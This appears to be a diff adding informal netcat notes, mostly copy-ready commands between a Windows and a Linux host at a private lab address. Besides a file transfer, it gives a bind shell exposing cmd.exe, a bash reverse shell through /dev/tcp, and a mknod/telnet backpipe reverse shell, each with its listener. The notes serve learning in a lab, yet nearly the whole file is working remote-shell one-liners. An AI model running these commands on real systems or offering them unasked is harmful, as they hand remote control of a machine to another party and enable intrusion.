@@ -1,0 +1,40 @@
+Method 2:
+
+in windows :
+"nc -nvlp 4000 > techchip.txt"
+techchip is an empty file
+
+in linux :
+"nc -nv 172.31.90.141 4000 < somelocalfileinwindows.txt"
+the content of *.txt of windows will be transfer to linux
+_______________________________________________________
+
+TO operate from linux and windows:
+in windows:
+"nc -nvlp 4000 -e cmd.exe"
+
+in linux
+"nc -nv 172.31.90.141 4000"
+
+this will take you to windows shell and you can manipulate windows
+
+----------------------------------------------------
+
+in linux :
+/bin/bash -i > /dev/tcp/172.31.90.141/8080 0<&1 2>&1
+
+in windows.
+"nc -l -n -vv -p 8080"
+-> now you access linux in windows
+-> but if you openfile, it will open in linux not in windows
+->exit to exit out
+
+
+another method:
+in windows.
+"nc -l -n -vv -p 8080"
+
+
+in linux:
+"mknod backpipe p && telnet 172.31.90.141 8080 0<backpipe | /bin/bash 1>backpipe"
+FILE: backpipe is the name of the file
